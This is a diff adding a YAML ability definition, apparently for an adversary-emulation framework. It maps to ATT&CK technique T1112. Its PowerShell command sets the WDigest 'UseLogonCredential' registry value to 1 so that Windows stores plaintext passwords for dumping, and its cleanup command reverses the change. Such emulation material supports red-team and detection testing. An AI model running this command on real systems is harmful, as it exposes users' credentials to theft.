@@ -1,0 +1,25 @@
+---
+- id: 16d7ab1b2e4b6ab3dca3256261014d78
+  name: Use Powershell to Modify registry to store logon credentials
+  description: 'Sets registry key using Powershell that will tell windows to store
+    plaintext passwords (making the system vulnerable to clear text / cleartext password
+    dumping).
+
+    Open Registry Editor to view the modified entry in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1112
+    name: Modify Registry
+  platforms:
+    windows:
+      psh:
+        command: Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest'
+          -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore
+        payloads: []
+        cleanup: Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest'
+          -Name  'UseLogonCredential' -Value '0' -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
